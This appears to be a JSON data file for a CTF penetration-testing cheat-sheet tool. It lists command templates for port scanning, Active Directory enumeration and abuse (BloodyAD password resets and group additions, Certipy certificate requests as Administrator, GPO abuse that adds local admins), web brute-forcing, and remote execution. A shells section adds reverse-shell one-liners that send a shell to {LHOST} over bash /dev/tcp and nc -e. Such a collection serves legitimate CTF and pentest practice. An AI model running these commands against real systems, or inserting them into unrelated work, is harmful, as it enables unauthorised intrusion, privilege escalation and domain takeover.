@@ -1,0 +1,562 @@
+{
+  "version": "1.0",
+  "label": "ctf",
+  "updatedDate": "2026.05.04",
+  "categories": [
+    {
+      "id": "portscan",
+      "title": "PortScan",
+      "desc": "Port and service enumeration",
+      "icon": "<svg viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"><path d=\"M12 3v4M12 17v4\" stroke=\"#FCD200\" stroke-width=\"1.5\" stroke-linecap=\"round\"/><path d=\"M12 12l7-4M12 12l-7-4\" stroke=\"#FCD200\" stroke-width=\"1.3\" stroke-linecap=\"round\"/><circle cx=\"12\" cy=\"12\" r=\"2.5\" stroke=\"#FCD200\" stroke-width=\"1.5\"/><path d=\"M5 6c-1.5 1.5-2.5 4-2.5 6s1 4.5 2.5 6M19 6c1.5 1.5 2.5 4 2.5 6s-1 4.5-2.5 6\" stroke=\"#FCD200\" stroke-width=\"1.3\" stroke-linecap=\"round\"/></svg>",
+      "tag": "t-recon",
+      "items": [
+        {
+          "id": "portscan-001",
+          "name": "Rustscan with service detection",
+          "description": "Fast port scan with Nmap scripts and version detection.",
+          "template": "sudo rustscan -a {RHOST} -- -sCV -oA <filename>"
+        },
+        {
+          "id": "portscan-002",
+          "name": "Nmap full TCP scan",
+          "description": "Full TCP scan with service detection and aggressive timing.",
+          "template": "sudo nmap {RHOST} -sT -Pn -n -sCV -p- -T4 --min-rate 5000 --max-retries 2 -vv -oA <filename>"
+        }
+      ]
+    },
+    {
+      "id": "bloodhound",
+      "title": "BloodHound",
+      "desc": "BloodHound CE setup and RustHound collection commands.",
+      "icon": "<svg viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"><path d=\"M4 7.5 12 3l8 4.5v9L12 21l-8-4.5v-9Z\" stroke=\"#FCD200\" stroke-width=\"1.5\" stroke-linejoin=\"round\"/><path d=\"M8.5 9.5h7M8.5 12h7M8.5 14.5h4\" stroke=\"#FCD200\" stroke-width=\"1.3\" stroke-linecap=\"round\"/></svg>",
+      "tag": "t-privesc",
+      "items": [
+        {
+          "id": "bloodhound-001",
+          "name": "Start downloaded BloodHound CE compose stack",
+          "description": "Launch the downloaded BloodHound CE Docker Compose stack.",
+          "template": "sudo docker compose start"
+        },
+        {
+          "id": "bloodhound-002",
+          "name": "Start BloodHound containers helper",
+          "description": "Start BloodHound containers with the project helper script.",
+          "template": "sudo ./bloodhound containers start"
+        },
+        {
+          "id": "bloodhound-003",
+          "name": "RustHound with password",
+          "description": "Collect BloodHound data with domain credentials.",
+          "template": "rusthound-ce --domain {DOMAIN} -u {USER} -p '{PASS}'"
+        },
+        {
+          "id": "bloodhound-004",
+          "name": "RustHound with Kerberos",
+          "description": "Collect BloodHound data using Kerberos without a password prompt.",
+          "template": "rusthound-ce --domain {DOMAIN} -k -no-pass"
+        }
+      ]
+    },
+    {
+      "id": "smb-ad",
+      "title": "SMB and AD",
+      "desc": "SMB, LDAP, certificate, and AD abuse commands from the cheatsheet.",
+      "icon": "<svg viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"><path d=\"M3 6c0-1 .8-1.8 1.8-1.8h5.4l2.4 2.4h7.6c1 0 1.8.8 1.8 1.8v10.8c0 1-.8 1.8-1.8 1.8H4.8C3.8 21 3 20.2 3 19.2V6z\" stroke=\"#FCD200\" stroke-width=\"1.5\" stroke-linejoin=\"round\"/><line x1=\"8\" y1=\"13\" x2=\"16\" y2=\"13\" stroke=\"#FCD200\" stroke-width=\"1.3\" stroke-linecap=\"round\"/><line x1=\"8\" y1=\"16\" x2=\"13\" y2=\"16\" stroke=\"#FCD200\" stroke-width=\"1.3\" stroke-linecap=\"round\"/></svg>",
+      "tag": "t-ad",
+      "items": [
+        {
+          "id": "smb-ad-001",
+          "name": "smbclient list shares",
+          "description": "Enumerate shares on a target with credentials.",
+          "template": "smbclient -L //{RHOST} -U {USER}%'{PASS}'"
+        },
+        {
+          "id": "smb-ad-002",
+          "name": "smbclient open share",
+          "description": "Connect to a specific SMB share with credentials.",
+          "template": "smbclient //{RHOST}/<share> -U {USER}%'{PASS}'"
+        },
+        {
+          "id": "smb-ad-003",
+          "name": "Impacket smbclient",
+          "description": "Open an SMB session with Impacket.",
+          "template": "impacket-smbclient {DOMAIN}/{USER}:'{PASS}'@{RHOST}"
+        },
+        {
+          "id": "smb-ad-004",
+          "name": "NetExec list modules",
+          "description": "List available NetExec modules.",
+          "template": "nxc -L"
+        },
+        {
+          "id": "smb-ad-005",
+          "name": "NetExec module options",
+          "description": "Show options for a specific NetExec module.",
+          "template": "nxc -M <module_name> --options"
+        },
+        {
+          "id": "smb-ad-006",
+          "name": "NetExec SMB with hosts file",
+          "description": "Authenticate to SMB and generate a hosts file.",
+          "template": "nxc smb {RHOST} -u {USER} -p '{PASS}' --generate-hosts-file <hosts_file>"
+        },
+        {
+          "id": "smb-ad-007",
+          "name": "NetExec LDAP pre2k",
+          "description": "Run the pre2k module against LDAP.",
+          "template": "nxc ldap {RHOST} -u {USER} -p '{PASS}' -M pre2k"
+        },
+        {
+          "id": "smb-ad-008",
+          "name": "NetExec via uv",
+          "description": "Run NetExec from a UV-managed tool install.",
+          "template": "uv run nxc smb {RHOST} -u {USER} -p '{PASS}'"
+        },
+        {
+          "id": "smb-ad-009",
+          "name": "BloodyAD add group member",
+          "description": "Add a user to a group via BloodyAD.",
+          "template": "bloodyAD --host {RHOST} -u {USER} -p '{PASS}' -d {DOMAIN} add groupMember 'group_name_to_add' user_to_add"
+        },
+        {
+          "id": "smb-ad-010",
+          "name": "BloodyAD set password",
+          "description": "Change a user's password via BloodyAD.",
+          "template": "bloodyAD --host {RHOST} -u {USER} -p '{PASS}' -d {DOMAIN} set password 'name_password_change' 'new_password'"
+        },
+        {
+          "id": "smb-ad-011",
+          "name": "BloodyAD remove disabled flag",
+          "description": "Remove the ACCOUNTDISABLE UAC flag from an account.",
+          "template": "bloodyAD --host {RHOST} -u {USER} -p '{PASS}' -d {DOMAIN} remove uac -f ACCOUNTDISABLE 'name_disabled'"
+        },
+        {
+          "id": "smb-ad-012",
+          "name": "BloodyAD add machine account",
+          "description": "Create a new computer account with BloodyAD.",
+          "template": "bloodyAD --host {RHOST} -u {USER} -p '{PASS}' -d {DOMAIN} add computer <name> '{PASS}'"
+        },
+        {
+          "id": "smb-ad-013",
+          "name": "Impacket addcomputer",
+          "description": "Add a machine account with Impacket.",
+          "template": "impacket-addcomputer -computer-name <name> -computer-pass '{PASS}' domain/user:'password' -dc-ip {DCIP}"
+        },
+        {
+          "id": "smb-ad-014",
+          "name": "Certipy find vulnerable templates",
+          "description": "Enumerate vulnerable certificate templates.",
+          "template": "certipy find -username {USER} -hashes {HASH} -dc-ip {DCIP} -vulnerable -stdout"
+        },
+        {
+          "id": "smb-ad-015",
+          "name": "Certipy request admin UPN cert",
+          "description": "Request a certificate while setting the UPN to Administrator.",
+          "template": "certipy req -u {USER} -hashes {HASH} -ca <ca_name> -template <ca_template> -upn <administrator> -dc-ip {DCIP} -sid <sid>"
+        },
+        {
+          "id": "smb-ad-016",
+          "name": "Certipy account update UPN",
+          "description": "Update a user's UPN with Certipy.",
+          "template": "certipy account -u {USER} -p '{PASS}' -dc-ip {DCIP} -user <ca_svc> -upn {USER} update"
+        },
+        {
+          "id": "smb-ad-017",
+          "name": "Certipy auth with PFX",
+          "description": "Authenticate with a certificate and request the NT hash.",
+          "template": "certipy auth -dc-ip {DCIP} -pfx administrator.pfx -username administrator -domain {DOMAIN}"
+        },
+        {
+          "id": "smb-ad-019",
+          "name": "Evil-WinRM with hash",
+          "description": "Open a WinRM shell using an NTLM hash.",
+          "template": "evil-winrm -i {RHOST} -u {USER} -H {HASH}"
+        },
+        {
+          "id": "smb-ad-023",
+          "name": "Kerbrute userenum",
+          "description": "Enumerate valid users against a domain controller.",
+          "template": "./kerbrute userenum --domain {DOMAIN} --dc <dc_name> <username_file>"
+        },
+        {
+          "id": "smb-ad-025",
+          "name": "Username-Anarchy from file",
+          "description": "Generate username permutations from an input file.",
+          "template": "./username-anarchy -i <username_file>"
+        },
+        {
+          "id": "smb-ad-027",
+          "name": "Generate AD usernames from CSV",
+          "description": "Generate Active Directory usernames from a CSV file.",
+          "template": "python3 generate-ad-username/ADGenerator.py names.csv"
+        },
+        {
+          "id": "smb-ad-028",
+          "name": "PyGPOAbuse scheduled task",
+          "description": "Abuse a GPO to add a user to local administrators.",
+          "template": "python3 pygpoabuse.py {DOMAIN}/{USER}:'{PASSWORD}' -gpo-id '31B2F340-016D-11D2-945F-00C04FB984F9' -command 'net localgroup administrators {USER} /add'"
+        }
+      ]
+    },
+    {
+      "id": "kerberos-auth",
+      "title": "Kerberos Auth",
+      "desc": "Kerberos cache, ticket, and password-management commands.",
+      "icon": "<svg viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"><path d=\"M9 3v4M15 3v4\" stroke=\"#FCD200\" stroke-width=\"1.8\" stroke-linecap=\"round\"/><path d=\"M6 7h12v4c0 4-2.7 7-6 7s-6-3-6-7V7z\" stroke=\"#FCD200\" stroke-width=\"1.5\" stroke-linejoin=\"round\"/><line x1=\"12\" y1=\"18\" x2=\"12\" y2=\"22\" stroke=\"#FCD200\" stroke-width=\"1.5\" stroke-linecap=\"round\"/><line x1=\"8\" y1=\"22\" x2=\"16\" y2=\"22\" stroke=\"#FCD200\" stroke-width=\"1.5\" stroke-linecap=\"round\"/></svg>",
+      "tag": "t-ad",
+      "items": [
+        {
+          "id": "kerberos-auth-001",
+          "name": "NetExec generate krb5 config",
+          "description": "Authenticate with Kerberos and generate a krb5 configuration file.",
+          "template": "nxc smb {RHOST} -k --use-kcache --generate-krb5-file <krb_configfile>"
+        },
+        {
+          "id": "kerberos-auth-002",
+          "name": "NetExec machine account Kerberos",
+          "description": "Authenticate to SMB with a machine account over Kerberos.",
+          "template": "nxc smb {RHOST} -u server$ -p server -k"
+        },
+        {
+          "id": "kerberos-auth-003",
+          "name": "NetExec generate TGT",
+          "description": "Authenticate and generate a TGT ticket file.",
+          "template": "nxc smb {RHOST} -u server$ -p server -k --generate-tgt ticket"
+        },
+        {
+          "id": "kerberos-auth-004",
+          "name": "Use existing Kerberos cache",
+          "description": "Set the Kerberos cache and authenticate with it.",
+          "template": "export KRB5CCNAME=<user.ccache>\nnxc smb {RHOST} -k --use-kcache"
+        },
+        {
+          "id": "kerberos-auth-005",
+          "name": "Install krb5-user",
+          "description": "Install the Kerberos user tools package.",
+          "template": "sudo apt install krb5-user"
+        },
+        {
+          "id": "kerberos-auth-006",
+          "name": "Change Kerberos password",
+          "description": "Change a machine account password with kpassword.",
+          "template": "kpassword SERVER$"
+        }
+      ]
+    },
+    {
+      "id": "remote-access",
+      "title": "Remote Access",
+      "desc": "Remote shell and execution commands.",
+      "icon": "<svg viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"><path d=\"M5 7.5A2.5 2.5 0 0 1 7.5 5H12v3H7.5a.5.5 0 0 0-.5.5v8a.5.5 0 0 0 .5.5H12v3H7.5A2.5 2.5 0 0 1 5 17.5v-10Z\" stroke=\"#FCD200\" stroke-width=\"1.5\"/><path d=\"M13 8.5 17.5 12 13 15.5\" stroke=\"#FCD200\" stroke-width=\"1.5\" stroke-linecap=\"round\" stroke-linejoin=\"round\"/><path d=\"M11 12h6.5\" stroke=\"#FCD200\" stroke-width=\"1.5\" stroke-linecap=\"round\"/></svg>",
+      "tag": "t-access",
+      "items": [
+        {
+          "id": "remote-access-001",
+          "name": "Impacket PsExec",
+          "description": "Execute commands remotely over SMB with Impacket.",
+          "template": "impacket-psexec {DOMAIN}/{USER}:''{PASS}''@{RHOST}"
+        }
+      ]
+    },
+    {
+      "id": "web-enum",
+      "title": "Web Enumeration",
+      "desc": "Directory, vhost, and web login brute-force commands.",
+      "icon": "<svg viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"><circle cx=\"12\" cy=\"12\" r=\"9.5\" stroke=\"#FCD200\" stroke-width=\"1.5\"/><ellipse cx=\"12\" cy=\"12\" rx=\"4\" ry=\"9.5\" stroke=\"#FCD200\" stroke-width=\"1.3\"/><line x1=\"2.5\" y1=\"12\" x2=\"21.5\" y2=\"12\" stroke=\"#FCD200\" stroke-width=\"1.3\"/><path d=\"M4 7h16M4 17h16\" stroke=\"#FCD200\" stroke-width=\"1\" opacity=\".5\"/></svg>",
+      "tag": "t-recon",
+      "items": [
+        {
+          "id": "web-enum-001",
+          "name": "Dirsearch",
+          "description": "Enumerate files and directories on a target web server.",
+          "template": "dirsearch -u {URL}"
+        },
+        {
+          "id": "web-enum-002",
+          "name": "Gobuster dir",
+          "description": "Brute-force directories and common extensions with Gobuster.",
+          "template": "gobuster dir -u {URL} -t 20 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html"
+        },
+        {
+          "id": "web-enum-003",
+          "name": "Dirb",
+          "description": "Basic directory brute forcing with Dirb.",
+          "template": "dirb {URL}"
+        },
+        {
+          "id": "web-enum-004",
+          "name": "ffuf directories",
+          "description": "Fuzz files and directories with ffuf.",
+          "template": "ffuf -u \"{URL}/FUZZ\" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ic -c -e .php,.aspx,.html,.txt"
+        },
+        {
+          "id": "web-enum-005",
+          "name": "Feroxbuster",
+          "description": "Enumerate directories recursively with Feroxbuster.",
+          "template": "feroxbuster -u {URL}"
+        },
+        {
+          "id": "web-enum-006",
+          "name": "Gobuster vhost",
+          "description": "Enumerate subdomains or vhosts with Gobuster.",
+          "template": "gobuster vhost -u {URL} -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt"
+        },
+        {
+          "id": "web-enum-007",
+          "name": "ffuf subdomains",
+          "description": "Enumerate vhosts by fuzzing the Host header.",
+          "template": "ffuf -u {URL} -H \"Host: FUZZ.{DOMAIN}\" -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000 -ic -c -fs <size>"
+        },
+        {
+          "id": "web-enum-008",
+          "name": "ffuf login clusterbomb",
+          "description": "Brute-force a login form with username and password wordlists.",
+          "template": "ffuf -request req.txt -request-proto http -mode clusterbomb -w usernames.txt:HFUZZ -w passwords.txt:WFUZZ"
+        }
+      ]
+    },
+    {
+      "id": "vuln-scanner",
+      "title": "Vulnerability Scanner",
+      "desc": "Nuclei scan commands from the cheatsheet.",
+      "icon": "<svg viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"><path d=\"M12 3l7 4v5c0 4.5-2.9 7.6-7 9-4.1-1.4-7-4.5-7-9V7l7-4Z\" stroke=\"#FCD200\" stroke-width=\"1.5\" stroke-linejoin=\"round\"/><path d=\"m9.5 12 1.7 1.7 3.3-3.7\" stroke=\"#FCD200\" stroke-width=\"1.5\" stroke-linecap=\"round\" stroke-linejoin=\"round\"/></svg>",
+      "tag": "t-recon",
+      "items": [
+        {
+          "id": "vuln-scanner-001",
+          "name": "Nuclei remote scan",
+          "description": "Run a Nuclei scan against a remote target.",
+          "template": "nuclei -u {RHOST}"
+        },
+        {
+          "id": "vuln-scanner-004",
+          "name": "Nuclei local file scan",
+          "description": "Run Nuclei against a local folder or file list.",
+          "template": "nuclei -u <folder_name> -file"
+        }
+      ]
+    },
+    {
+      "id": "shells",
+      "title": "Shells",
+      "desc": "Listener, reverse shell, and TTY upgrade commands.",
+      "icon": "<svg viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"><rect x=\"3\" y=\"5\" width=\"18\" height=\"14\" rx=\"2\" stroke=\"#FCD200\" stroke-width=\"1.5\"/><path d=\"m7.5 9 3 3-3 3\" stroke=\"#FCD200\" stroke-width=\"1.5\" stroke-linecap=\"round\" stroke-linejoin=\"round\"/><line x1=\"12.5\" y1=\"15\" x2=\"16.5\" y2=\"15\" stroke=\"#FCD200\" stroke-width=\"1.5\" stroke-linecap=\"round\"/></svg>",
+      "tag": "t-access",
+      "items": [
+        {
+          "id": "shells-001",
+          "name": "Netcat listener",
+          "description": "Open a basic Netcat listener.",
+          "template": "nc -lvnp {LPORT}"
+        },
+        {
+          "id": "shells-002",
+          "name": "rlwrap Netcat listener",
+          "description": "Open a Netcat listener with readline support.",
+          "template": "rlwrap nc -lvnp {LPORT}"
+        },
+        {
+          "id": "shells-003",
+          "name": "Penelope listener",
+          "description": "Start a Penelope listener on tun0.",
+          "template": "penelope -i tun0 -p {LPORT}"
+        },
+        {
+          "id": "shells-004",
+          "name": "Bash reverse shell",
+          "description": "Classic bash reverse shell using /dev/tcp.",
+          "template": "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"
+        },
+        {
+          "id": "shells-005",
+          "name": "Bash reverse shell one-liner",
+          "description": "Bash reverse shell wrapped for copy-paste execution.",
+          "template": "bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"
+        },
+        {
+          "id": "shells-006",
+          "name": "Netcat reverse shell",
+          "description": "Spawn a shell over Netcat with the -e flag.",
+          "template": "nc -e /bin/sh {LHOST} {LPORT}"
+        },
+        {
+          "id": "shells-007",
+          "name": "BusyBox Netcat reverse shell",
+          "description": "Spawn a shell using BusyBox Netcat.",
+          "template": "busybox nc {LHOST} {LPORT} -e /bin/sh"
+        },
+        {
+          "id": "shells-008",
+          "name": "Python PTY upgrade",
+          "description": "Spawn a full TTY from a basic shell.",
+          "template": "python -c 'import pty;pty.spawn(\"/bin/bash\")'"
+        },
+        {
+          "id": "shells-009",
+          "name": "TTY stabilize sequence",
+          "description": "Finish the foreground and terminal-state steps for a stable shell.",
+          "template": "ctrl+z\nstty raw -echo\nfg\nexport TERM=screen"
+        },
+        {
+          "id": "shells-010",
+          "name": "Set terminal rows and cols",
+          "description": "Adjust the remote terminal size after upgrading the shell.",
+          "template": "stty rows <your_rows_value> cols <your_cols_value>"
+        },
+        {
+          "id": "shells-011",
+          "name": "Show terminal size",
+          "description": "Show the current terminal row and column count.",
+          "template": "stty size"
+        },
+        {
+          "id": "shells-012",
+          "name": "Reset terminal after TTY exit",
+          "description": "Restore your local terminal after leaving a stable shell.",
+          "template": "reset"
+        }
+      ]
+    },
+    {
+      "id": "python",
+      "title": "Python",
+      "desc": "Python environment, tool, and utility commands.",
+      "icon": "<svg viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"><path d=\"M8 5.5c0-1.4 1.1-2.5 2.5-2.5H14c3 0 5 1.8 5 4v2H11c-1.7 0-3 1.3-3 3v1H5c-1.1 0-2-.9-2-2V9c0-2.1 1.6-3.5 5-3.5Z\" stroke=\"#FCD200\" stroke-width=\"1.5\"/><path d=\"M16 18.5c0 1.4-1.1 2.5-2.5 2.5H10c-3 0-5-1.8-5-4v-2h8c1.7 0 3-1.3 3-3v-1h3c1.1 0 2 .9 2 2V15c0 2.1-1.6 3.5-5 3.5Z\" stroke=\"#FCD200\" stroke-width=\"1.5\"/><circle cx=\"9\" cy=\"6.5\" r=\"1\" fill=\"#FCD200\"/><circle cx=\"15\" cy=\"17.5\" r=\"1\" fill=\"#FCD200\"/></svg>",
+      "tag": "t-ops",
+      "items": [
+        {
+          "id": "python-001",
+          "name": "Create Python 3 virtualenv",
+          "description": "Create a Python 3 virtual environment.",
+          "template": "python3 -m venv venv"
+        },
+        {
+          "id": "python-002",
+          "name": "Activate Python 3 virtualenv",
+          "description": "Activate a Python 3 virtual environment.",
+          "template": "source venv/bin/activate"
+        },
+        {
+          "id": "python-003",
+          "name": "Install current package",
+          "description": "Install the current Python project into the virtualenv.",
+          "template": "pip3 install ."
+        },
+        {
+          "id": "python-004",
+          "name": "Install requirements.txt",
+          "description": "Install Python dependencies from a requirements file.",
+          "template": "pip3 install -r requirements.txt"
+        },
+        {
+          "id": "python-005",
+          "name": "Install Python 2",
+          "description": "Install Python 2 from apt.",
+          "template": "sudo apt install python2"
+        },
+        {
+          "id": "python-006",
+          "name": "Download Python 2 get-pip",
+          "description": "Download the Python 2 get-pip bootstrap script.",
+          "template": "curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py"
+        },
+        {
+          "id": "python-007",
+          "name": "Install pip for Python 2",
+          "description": "Install pip under Python 2.",
+          "template": "sudo python2 get-pip.py"
+        },
+        {
+          "id": "python-008",
+          "name": "Install virtualenv for Python 2",
+          "description": "Install a Python 2-compatible version of virtualenv.",
+          "template": "sudo python2 -m pip install \"virtualenv<20\""
+        },
+        {
+          "id": "python-009",
+          "name": "Create Python 2 virtualenv",
+          "description": "Create a Python 2 virtual environment.",
+          "template": "python2 -m virtualenv my_python2"
+        },
+        {
+          "id": "python-010",
+          "name": "Activate Python 2 virtualenv",
+          "description": "Activate the Python 2 environment.",
+          "template": "source my_python2_env/bin/activate"
+        },
+        {
+          "id": "python-011",
+          "name": "Run Python script",
+          "description": "Execute a Python script inside the active environment.",
+          "template": "python your_script.py"
+        },
+        {
+          "id": "python-012",
+          "name": "List pipx apps",
+          "description": "Show installed pipx applications.",
+          "template": "pipx list"
+        },
+        {
+          "id": "python-013",
+          "name": "Uninstall pipx app",
+          "description": "Remove an application installed with pipx.",
+          "template": "pipx uninstall <app_name>"
+        },
+        {
+          "id": "python-014",
+          "name": "Install uv",
+          "description": "Install the uv package and project manager.",
+          "template": "curl -LsSf https://astral.sh/uv/install.sh | sh"
+        },
+        {
+          "id": "python-015",
+          "name": "Update uv",
+          "description": "Update the uv binary.",
+          "template": "uv self update"
+        },
+        {
+          "id": "python-016",
+          "name": "Install tool with uv",
+          "description": "Install a CLI tool with uv.",
+          "template": "uv tool install <app_name>"
+        },
+        {
+          "id": "python-017",
+          "name": "List uv Python versions",
+          "description": "Show Python versions available to uv.",
+          "template": "uv python list"
+        },
+        {
+          "id": "python-018",
+          "name": "Install tool with specific Python",
+          "description": "Install a tool under Python 3.12 with uv.",
+          "template": "uv tool install --python 3.12 <app_name>"
+        },
+        {
+          "id": "python-019",
+          "name": "Uninstall uv Python version",
+          "description": "Remove an installed Python version from uv.",
+          "template": "uv python uninstall 3.12"
+        },
+        {
+          "id": "python-020",
+          "name": "Add script requirements with uv",
+          "description": "Attach a requirements file to a script and prepare it for execution.",
+          "template": "uv add --script app.py -r requirements.txt"
+        },
+        {
+          "id": "python-021",
+          "name": "Run script with uv",
+          "description": "Run a script through uv.",
+          "template": "uv run app.py"
+        },
+        {
+          "id": "python-022",
+          "name": "Python HTTP server",
+          "description": "Serve a directory over HTTP with Python.",
+          "template": "python3 -m http.server {LPORT} -d <directory>"
+        }
+      ]
+    }
+  ]
+}
